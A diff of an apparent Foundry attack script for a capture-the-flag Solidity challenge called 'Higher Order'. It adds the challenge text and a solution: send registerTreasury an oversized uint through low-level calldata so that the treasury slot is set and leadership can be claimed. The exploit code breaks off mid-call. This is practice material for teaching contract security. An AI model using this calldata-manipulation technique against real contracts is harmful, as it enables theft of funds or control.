@@ -6,9 +6,25 @@ import "../src/HigherOrder.sol";
 import "forge-std/Script.sol";
 import "forge-std/console.sol";
 
+
+/*
+    Imagine a world where the rules are meant to be broken, and only the cunning and the bold can rise to power.
+    Welcome to the Higher Order, a group shrouded in mystery, where a treasure awaits and a commander rules supreme.
+
+    Your objective is to become the Commander of the Higher Order! Good luck!
+
+    Things that might help:
+        Sometimes, calldata cannot be trusted.
+        Compilers are constantly evolving into better spaceships.
+
+
+    Solution
+    Use low level .call() to send the registerTreasury function with a larger uint in the calldata
+
+ */
 contract HigherOrderAttack {
     constructor(HigherOrder _higherorder) public {
-        // We need to send a uint8 of > 255 in the calldata of registerTreasury from an offset of 4 bytes
+        // We need to send a uint8 of > 255 in the calldata of registerTreasury
         // This will store the number in the treasury slot
         // Then we can call claimLeadership
         bytes memory data = abi.encodeWithSignature(
